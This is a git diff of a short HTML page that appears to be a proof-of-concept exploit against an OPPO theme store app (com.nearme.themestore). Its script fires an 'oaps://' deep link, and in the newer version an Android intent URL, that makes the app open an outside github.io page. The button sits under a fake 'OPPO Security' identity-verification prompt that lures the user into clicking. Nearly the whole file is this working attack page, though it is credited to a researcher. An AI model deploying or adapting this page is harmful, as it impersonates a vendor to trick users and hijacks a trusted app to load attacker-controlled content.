@@ -2,37 +2,31 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Security Hub</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Verification</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f0f0f0; }
-        .card { background: white; margin: auto; padding: 30px; border-radius: 15px; width: 80%; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        .btn { display: block; width: 100%; padding: 15px; background: #05ba7d; color: white; text-decoration: none; border-radius: 8px; font-weight: bold; border: none; font-size: 16px; cursor: pointer; }
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f5f5f5; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; width: 85%; }
+        .btn { display: block; width: 100%; padding: 15px; background: #05ba7d; color: white; text-decoration: none; border-radius: 8px; font-weight: bold; border: none; font-size: 18px; cursor: pointer; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h2 style="color:#05ba7d;">System Update</h2>
-    <p>Please click below to complete the security verification in the official app.</p>
+    <h2 style="color: #05ba7d;">OPPO Security</h2>
+    <p>Identity verification is required. Click the button to continue in the official app.</p>
     
-    <button onclick="openApp()" class="btn">VERIFY NOW</button>
+    <button onclick="triggerIntent()" class="btn">OPEN IN APP</button>
     
-    <p style="margin-top:20px; font-size:10px; color:#bbb;">ID: yazid47</p>
+    <p style="margin-top: 20px; font-size: 11px; color: #888;">Researcher: yazid47</p>
 </div>
 
 <script>
-    function openApp() {
-        // The Exploit Link
-        var payload = "oaps://domore/web?url=https://yazidtokyo43.github.io/oppo-tes/";
+    function triggerIntent() {
+        // هذا الرابط يجبر المتصفح على استدعاء التطبيق مباشرة عبر نظام Intent
+        var intentUrl = "intent://domore/web?url=https://yazidtokyo43.github.io/oppo-tes/#Intent;scheme=oaps;package=com.nearme.themestore;end";
         
-        // Strategy 1: Direct location change
-        window.location.replace(payload);
-        
-        // Strategy 2: Backup after 300ms
-        setTimeout(function() {
-            window.location.href = payload;
-        }, 300);
+        window.location.href = intentUrl;
     }
 </script>
 
